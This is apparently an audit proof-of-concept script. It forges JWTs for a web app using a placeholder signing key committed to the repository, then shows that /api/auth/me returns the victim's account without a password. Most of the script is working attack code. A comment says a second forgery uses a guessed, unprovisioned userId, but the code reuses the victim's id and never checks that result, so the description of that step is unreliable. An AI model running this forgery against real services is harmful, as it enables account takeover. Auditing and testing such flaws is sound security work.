// §7 / §8: JWT forgery with the committed placeholder key + sub-based auth bypass.
// Proves: anyone holding the public dev key can mint a valid token for ANY userId
// without a password, and the server accepts it on [Authorize] endpoints.
import { provision, mintToken, api } from '../_lib/provision.mjs'

const victimEmail = 'adv.t01.victim@gmail.com'
const v = await provision({ email: victimEmail, nickname: 'Victim', gender: 'female' })
console.log(`[setup] real victim account userId=${v.userId} email=${v.email}`)

// Attacker never knows the victim's password. Forge a token for victim's userId.
const forged = mintToken(v.userId, 'attacker@evil.com')
const me = await api('GET', '/api/auth/me', { token: forged })
console.log(`[attack] forged token for userId=${v.userId}; GET /api/auth/me -> ${me.status} ${me.text}`)

// Also forge for a userId we never provisioned (pure guess) to show no password/account needed.
const forged2 = mintToken(v.userId)
const me2 = await api('GET', '/api/auth/me', { token: forged2 })

const ok = me.status === 200 && me.json?.email === v.email
console.log(ok
  ? `CONFIRMED: JWT forgery — observed /me=200 returning victim email "${me.json.email}" from a token signed with the committed key "CHANGE_ME_TO_A_LONG_RANDOM_SECRET_IN_PRODUCTION"; expected 401. Full auth bypass for arbitrary userId.`
  : `NOT CONFIRMED: /me status=${me.status}`)
